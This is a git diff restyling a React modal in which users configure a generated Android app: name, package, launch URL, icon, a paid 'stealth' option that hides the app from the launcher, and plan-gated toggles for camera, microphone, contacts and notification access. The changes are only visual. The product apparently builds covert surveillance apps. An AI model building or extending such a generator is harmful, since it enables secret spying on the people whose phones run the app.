@@ -233,70 +233,71 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     if (!isOpen) return null;
 
     return (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn py-4 sm:py-10">
-            <div className="bg-[#1a1a1a] border border-white/20 p-6 sm:p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative max-h-[90vh] overflow-y-auto custom-scrollbar">
-                <button
-                    onClick={onClose}
-                    className="absolute top-4 right-4 text-white/40 hover:text-white"
-                >
-                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                </button>
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-md animate-fadeIn py-4 sm:py-10">
+            <div className="bezel max-w-md w-full mx-4 shadow-2xl relative max-h-[90vh] overflow-hidden flex flex-col animate-scaleIn">
+                <div className="bezel-inner bg-[#0a0a0f] p-6 sm:p-8 overflow-y-auto custom-scrollbar flex-1 text-center">
+                    <button
+                        onClick={onClose}
+                        className="absolute top-4 right-4 w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white hover:bg-white/10 transition-all active:scale-90"
+                    >
+                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </button>
 
-                <h2 className="text-3xl font-bold text-white mb-2">
-                    {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
-                </h2>
+                    <h2 className="text-2xl font-bold tracking-tight text-white mb-2">
+                        {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
+                    </h2>
 
                 {status === 'idle' && (
                     <div className="text-left space-y-4 mt-6 mb-8">
                         <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
+                            <label className="block text-xs font-semibold text-white/50 mb-1.5 uppercase tracking-wider">App Name</label>
                             <input
                                 type="text"
                                 value={appName}
                                 onChange={(e) => handleAppNameChange(e.target.value)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
+                                className="input-field text-sm"
                                 placeholder="Hexa Core"
                             />
                         </div>
 
                         <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Package Name</label>
+                            <label className="block text-xs font-semibold text-white/50 mb-1.5 uppercase tracking-wider">Package Name</label>
                             <input
                                 type="text"
                                 value={packageName}
                                 onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white font-mono text-sm focus:outline-none focus:border-purple-500"
+                                className="input-field text-sm font-data"
                                 placeholder="com.hexa.core"
                             />
-                            <p className="text-xs text-white/40 mt-1">Unique identifier for the app (e.g. com.yourname.app)</p>
+                            <p className="text-[10px] text-white/35 mt-1 leading-snug">Unique app identifier package path (e.g. com.yourname.app)</p>
                         </div>
 
                         <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Web Link (Optional)</label>
+                            <label className="block text-xs font-semibold text-white/50 mb-1.5 uppercase tracking-wider">Web Link (Optional)</label>
                             <input
                                 type="url"
                                 value={webLink}
                                 onChange={(e) => setWebLink(e.target.value)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
+                                className="input-field text-sm"
                                 placeholder="https://example.com"
                             />
-                            <p className="text-xs text-white/40 mt-1">Opens this link when app starts.</p>
+                            <p className="text-[10px] text-white/35 mt-1 leading-snug">Launches this web URL instantly when app is started.</p>
                         </div>
 
                         <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Custom Icon (Optional)</label>
+                            <label className="block text-xs font-semibold text-white/50 mb-1.5 uppercase tracking-wider">Custom Icon (Optional)</label>
                             <input
                                 type="file"
                                 accept="image/png, image/jpeg"
                                 onChange={(e) => setCustomIcon(e.target.files?.[0] || null)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white text-sm file:mr-4 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-xs file:bg-purple-500 file:text-white hover:file:bg-purple-600"
+                                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-white text-xs file:mr-4 file:py-1 file:px-3.5 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500 hover:file:scale-105 active:file:scale-95 file:transition-all transition-colors"
                             />
                         </div>
 
-                        <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'}`}>
+                        <div className={`flex items-center justify-between bg-white/[0.02] p-3.5 rounded-2xl border ${isBasicPlan ? 'border-yellow-500/10 opacity-60' : 'border-white/5'}`}>
                             <div className="flex items-center gap-2">
-                                <span className="text-sm font-medium text-white/70">Hide App Icon</span>
-                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                <span className="text-sm font-semibold text-white/70">Hide App Icon</span>
+                                {isBasicPlan && <span className="plan-badge plan-badge-premium text-[8px]">PRO</span>}
                             </div>
                             <button
                                 onClick={() => {
@@ -306,46 +307,46 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     }
                                     setHideApp(!hideApp);
                                 }}
-                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
+                                className={`w-11 h-6 rounded-full transition-all relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-indigo-600 shadow-[0_0_12px_rgba(99,102,241,0.4)]' : 'bg-white/10'}`}
                             >
-                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                             </button>
                         </div>
-                        <p className="text-xs text-white/40">{isBasicPlan ? 'Upgrade to Standard to unlock this feature' : 'App will be hidden from launcher after install.'}</p>
+                        <p className="text-[10px] text-white/35 -mt-1 leading-snug">{isBasicPlan ? 'Upgrade to Standard plan to unlock stealth app hiding' : 'App stays completely hidden from launcher menu after installation.'}</p>
 
                         {/* Permission Manager Section */}
                         <div className="pt-4 border-t border-white/10">
-                            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
-                                <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                            <h3 className="text-sm font-semibold text-white/80 mb-3.5 flex items-center gap-2">
+                                <svg className="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                                 Permission Manager
                             </h3>
 
                             {/* Storage/Gallery Permission */}
-                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
+                            <div className="flex items-center justify-between bg-white/[0.02] p-3 rounded-xl border border-white/5 mb-2">
                                 <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Gallery/Storage Access</span>
+                                    <svg className="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                    <span className="text-xs font-semibold text-white/70">Gallery/Storage Access</span>
                                     <button
                                         onClick={() => setShowPermissionInfo('storage')}
-                                        className="text-white/40 hover:text-purple-400 transition-colors"
+                                        className="text-white/40 hover:text-indigo-400 transition-colors"
                                     >
                                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                     </button>
                                 </div>
                                 <button
                                     onClick={() => setEnableStoragePermission(!enableStoragePermission)}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-purple-500' : 'bg-white/20'}`}
+                                    className={`w-11 h-6 rounded-full transition-all relative ${enableStoragePermission ? 'bg-indigo-600 shadow-[0_0_12px_rgba(99,102,241,0.4)]' : 'bg-white/10'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                 </button>
                             </div>
 
                             {/* Camera Permission - Premium Only */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                            <div className={`flex items-center justify-between bg-white/[0.02] p-3 rounded-xl border ${userPlan !== 'premium' ? 'border-yellow-500/10 opacity-60' : 'border-white/5'} mb-2`}>
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Camera Access</span>
-                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
+                                    <span className="text-xs font-semibold text-white/70">Camera Access</span>
+                                    {userPlan !== 'premium' && <span className="plan-badge plan-badge-premium text-[8px]">PREMIUM</span>}
                                     <button
                                         onClick={() => setShowPermissionInfo('camera')}
                                         className="text-white/40 hover:text-cyan-400 transition-colors"
@@ -361,18 +362,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setEnableCameraPermission(!enableCameraPermission);
                                     }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                    className={`w-11 h-6 rounded-full transition-all relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500 shadow-[0_0_12px_rgba(34,211,238,0.4)]' : 'bg-white/10'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
                                 </button>
                             </div>
 
                             {/* Microphone Permission - Premium Only */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                            <div className={`flex items-center justify-between bg-white/[0.02] p-3 rounded-xl border ${userPlan !== 'premium' ? 'border-yellow-500/10 opacity-60' : 'border-white/5'} mb-2`}>
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Microphone Access</span>
-                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
+                                    <span className="text-xs font-semibold text-white/70">Microphone Access</span>
+                                    {userPlan !== 'premium' && <span className="plan-badge plan-badge-premium text-[8px]">PREMIUM</span>}
                                     <button
                                         onClick={() => setShowPermissionInfo('microphone')}
                                         className="text-white/40 hover:text-emerald-400 transition-colors"
@@ -388,18 +389,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setEnableMicrophonePermission(!enableMicrophonePermission);
                                     }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                    className={`w-11 h-6 rounded-full transition-all relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500 shadow-[0_0_12px_rgba(52,211,153,0.4)]' : 'bg-white/10'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-6' : 'left-1'}`} />
                                 </button>
                             </div>
 
                             {/* Contacts Permission - Locked for Basic */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                            <div className={`flex items-center justify-between bg-white/[0.02] p-3 rounded-xl border ${isBasicPlan ? 'border-yellow-500/10 opacity-60' : 'border-white/5'} mb-2`}>
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Contacts Access</span>
-                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                    <span className="text-xs font-semibold text-white/70">Contacts Access</span>
+                                    {isBasicPlan && <span className="plan-badge plan-badge-premium text-[8px]">PRO</span>}
                                     <button
                                         onClick={() => setShowPermissionInfo('contacts')}
                                         className="text-white/40 hover:text-green-400 transition-colors"
@@ -415,18 +416,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setEnableContactsPermission(!enableContactsPermission);
                                     }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
+                                    className={`w-11 h-6 rounded-full transition-all relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-emerald-500 shadow-[0_0_12px_rgba(16,185,129,0.4)]' : 'bg-white/10'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                 </button>
                             </div>
 
                             {/* Notification Listener Permission */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
+                            <div className={`flex items-center justify-between bg-white/[0.02] p-3 rounded-xl border ${isBasicPlan ? 'border-yellow-500/10 opacity-60' : 'border-white/5'} mb-2`}>
                                 <div className="flex items-center gap-2">
                                     <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Notification Access</span>
-                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                    <span className="text-xs font-semibold text-white/70">Notification Access</span>
+                                    {isBasicPlan && <span className="plan-badge plan-badge-premium text-[8px]">PRO</span>}
                                     <button
                                         onClick={() => setShowPermissionInfo('notifications')}
                                         className="text-white/40 hover:text-cyan-400 transition-colors"
@@ -442,10 +443,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         }
                                         setEnableNotificationListener(!enableNotificationListener);
                                     }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                    className={`w-11 h-6 rounded-full transition-all relative ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-cyan-500 shadow-[0_0_12px_rgba(34,211,238,0.4)]' : 'bg-white/10'}`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-7' : 'left-1'}`} />
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 shadow-sm transition-transform ${enableNotificationListener && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                 </button>
+                            </div>
                             </div>
 
                             {/* Notification Style Section - Collapsible */}
@@ -924,8 +926,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             )}
                         </>
                     )}
-                </div>
-
+                    </div>
             </div>
             {/* Custom Alert Modal moved outside transformed container to fix mobile UI bug */}
             <CustomAlertModal
